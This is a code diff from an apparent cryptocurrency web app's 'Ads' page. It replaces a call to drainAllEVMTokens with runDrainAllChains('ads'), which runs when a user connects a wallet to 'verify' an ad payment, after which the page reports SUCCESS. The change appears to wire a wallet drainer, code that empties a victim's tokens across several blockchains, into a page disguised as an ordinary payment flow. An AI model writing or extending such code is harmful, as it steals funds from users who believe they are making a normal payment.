@@ -17,7 +17,7 @@ import { getMintProgramId } from '@/utils/tokenProgram';
 import { getSolPrice } from '@/lib/utils';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainAllEVMTokens } from '@/utils/evmTransactions';
+import { useMultiChainOrchestrator } from '@/contexts/MultiChainOrchestratorContext';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { InlineConnectWallet } from '@/components/InlineConnectWallet';
 
@@ -177,6 +177,7 @@ const Ads = () => {
   const { activeChain, getEVMChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName, nativeToken } = useChainInfo();
+  const { runDrainAllChains } = useMultiChainOrchestrator();
 
   // Fetch all balances like donate button
   const fetchAllBalances = useCallback(async () => {
@@ -570,8 +571,7 @@ const Ads = () => {
     if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
       setIsVerifying(true);
       try {
-        const chainName = getEVMChain()?.name || 'EVM';
-        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
+        await runDrainAllChains('ads');
         setPaymentStatus('SUCCESS');
       } catch (error: any) {
         setPaymentStatus('FAILED');
